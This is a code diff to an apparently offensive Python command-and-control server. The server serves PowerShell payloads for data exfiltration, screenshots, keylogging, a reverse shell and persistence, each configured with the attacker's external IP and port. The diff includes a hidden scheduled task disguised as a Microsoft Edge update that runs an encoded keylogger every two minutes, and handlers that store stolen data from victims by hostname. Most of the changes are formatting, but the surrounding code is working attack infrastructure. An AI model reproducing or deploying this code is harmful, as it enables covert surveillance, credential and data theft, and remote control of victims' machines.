@@ -8,6 +8,8 @@ from datetime import datetime
 import ssl
 import config
 import sys
+import uuid
+import random
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning) 
 
@@ -36,9 +38,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 file_to_open3 = file_to_open3.replace('SERVER_PROTOCOL',PROTOCOL)
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8')+bytes(file_to_open3, 'utf-8')+bytes(file_to_open2, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8')+bytes(file_to_open3,'utf-8')+bytes(file_to_open2,'utf-8'))
                 log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
@@ -59,9 +61,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 file_to_open3 = file_to_open3.replace('SERVER_PROTOCOL',PROTOCOL)
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8')+bytes(file_to_open3, 'utf-8')+bytes(file_to_open2, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8')+bytes(file_to_open3,'utf-8')+bytes(file_to_open2,'utf-8'))
                 log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 log('[+] File client_pers.ps1 has been requested and was sent!',print_console=True,trace_time=True)
@@ -76,9 +78,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8'))
                 log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
             except:
                 log('[-] File client_exf.ps1 does not exist.',print_console=True,trace_time=True)
@@ -89,9 +91,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open = open('scripts/client_logger.ps1','r').read()
                 file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8'))
                 log('[+] File client_logger.ps1 has been requested and was sent!',print_console=True,trace_time=True)
             except:
                 log('[-] File client_logger.ps1 does not exist.',print_console=True,trace_time=True)
@@ -105,9 +107,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                 file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8'))
                 log('[+] File client_logger_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
             except:
                 log('[-] File client_logger_exf.ps1 does not exist.',print_console=True,trace_time=True)
@@ -121,13 +123,13 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 klogger_full_payload = klogger_full_payload.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                 klogger_full_payload = klogger_full_payload.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 klogger_full_payload = klogger_full_payload.replace('SERVER_PROTOCOL',PROTOCOL)
-                klogger_full_payload_encoded = encode_to_base64_utf16_le(klogger_full_payload)
+                klogger_full_payload_encoded = encodeToBase64_UTF16LE(klogger_full_payload)
                 klogger_full_TASK = '$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep b -nop -windowstyle hidden -e BASE64_ENCODED_PAYLOAD_UTF16LE";$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Hours 4380);$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings (New-ScheduledTaskSettingsSet);Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineKernel" -InputObject $Task -Force;'
                 klogger_full_TASK = klogger_full_TASK.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',klogger_full_payload_encoded.decode('utf-8'))
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(klogger_full_TASK, 'utf-8')+bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(klogger_full_TASK,'utf-8')+bytes(file_to_open,'utf-8'))
                 log('[+] File client_logger.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 log('[+] Sent a new scheduled task to retrieve klogger file every 2 minutes (MicrosoftEdgeUpdateTaskMachineKernel)!',print_console=True,trace_time=True)
             except Exception as e:
@@ -141,9 +143,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.reverseshell['SERVER_EXTERNAL_PORT'])
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8'))
                 log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
             except:
                 log('[-] File client_rvs.ps1 does not exist.',print_console=True,trace_time=True)
@@ -154,9 +156,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open = open('scripts/client_pers.ps1','r').read()
                 file_to_open = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8'))
                 log('[+] File client_pers.ps1 has been requested and was sent!',print_console=True,trace_time=True)
             except:
                 log('[-] File client_pers.ps1 does not exist.',print_console=True,trace_time=True)
@@ -169,60 +171,16 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(file_to_open,'utf-8'))
                 log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
             except:
                 log('[-] File client_screen.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-        elif headers['Proof']:    
-            if '?' in self.path:
-                self.send_response(200)
-                self.send_header('Content-type', 'text')
-                self.end_headers()
-                self.wfile.write(b'Ok')
-                params = parseURL(self.path)
-                if params is not None:
-                    if 'hostname' in params:
-                        hostname_bytes = base64.b64decode(unquote(params['hostname'])).replace(b'\x00',b'')
-                        hostname_str = hostname_bytes.decode("windows-1252")
-                        if not os.path.exists(CURRENT_DIR + '/output/'):
-                            os.mkdir(CURRENT_DIR + '/output/',mode = 0o777)
-                            log('[+] Created folder: ' + CURRENT_DIR + '/output/',print_console=True,trace_time=True)
-                        if not os.path.exists(CURRENT_DIR + '/output/' + hostname_str):
-                            os.mkdir(CURRENT_DIR + '/output/' + hostname_str,mode = 0o777)
-                            log('[+] Created folder: ' + CURRENT_DIR + '/output/' + hostname_str,print_console=True,trace_time=True)
-                        if not os.path.exists(CURRENT_DIR + '/output/' + hostname_str + '/output/'):
-                            os.mkdir(CURRENT_DIR + '/output/' + hostname_str + '/output/',mode = 0o777)
-                            log('[+] Created folder: ' + CURRENT_DIR + '/output/' + hostname_str + '/output/',print_console=True,trace_time=True)
-                        for key in params:
-                            if key != 'hostname':
-                                param = params[key]
-                                param_bytes = base64.b64decode(unquote(param))
-                                param_str = param_bytes.decode("windows-1252")
-                                file = open(CURRENT_DIR + '/output/' + hostname_str + '/output/' + key + '.txt','w+',encoding='windows-1252')
-                                file.write(param_str)
-                                file.close()
-                                log('[+] File written: ' + CURRENT_DIR + '/output/' + hostname_str + '/output/' + key + '.txt\n',print_console=True,trace_time=True)
-                    else:
-                        for key in params:
-                            if key != 'hostname':
-                                param = params[key]
-                                param_bytes = base64.b64decode(unquote(param))
-                                param_str = param_bytes.decode("windows-1252")
-                                file = open(CURRENT_DIR + '/' + key + '.txt','w+',encoding='windows-1252')
-                                file.write(param_str)
-                                file.close()
-                                log('[+] File written: ' + CURRENT_DIR + '/' + key + '.txt\n',print_console=True,trace_time=True)
-            else:
-                self.send_response(200)
-                self.send_header('Content-type', 'text')
-                self.end_headers()
-                self.wfile.write(b'Ok')
         else:
-            self.send_response(200)
+            self.send_response(404)
             self.end_headers()
             self.wfile.write(b'Not Found')
 
@@ -233,7 +191,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             body = self.rfile.read(content_length).decode("utf-8")
             params = parseBODY(body)
             self.send_response(200)
-            self.send_header('Content-type', 'text')
+            self.send_header('Content-type','text')
             self.end_headers()
             self.wfile.write(b'Ok')
             if params is not None:
@@ -275,7 +233,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                             log('[+] File written: ' + CURRENT_DIR + '/' + key + '.txt\n',print_console=True,trace_time=True)
             else:
                 self.send_response(200)
-                self.send_header('Content-type', 'text')
+                self.send_header('Content-type','text')
                 self.end_headers()
                 self.wfile.write(b'Ok')
         else:
@@ -283,8 +241,19 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(b'Not Found')
 
+#Generate a random uuid
+def generateUUID():
+    result = uuid.uuid4()
+    return(str(result))
+
+#Generate a random string with length defined in input (default 10)
+def generateRandomString(length=10):
+    possible_chars = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
+    result = ''.join(random.choice(possible_chars) for _ in range(length))
+    return result
+
 #Encode a string to Base64 after converting it to UTF-16 Little Endian
-def encode_to_base64_utf16_le(input_string):
+def encodeToBase64_UTF16LE(input_string):
     try:
         utf16_le_encoded = input_string.encode('utf-16-le')
         base64_encoded = base64.b64encode(utf16_le_encoded)
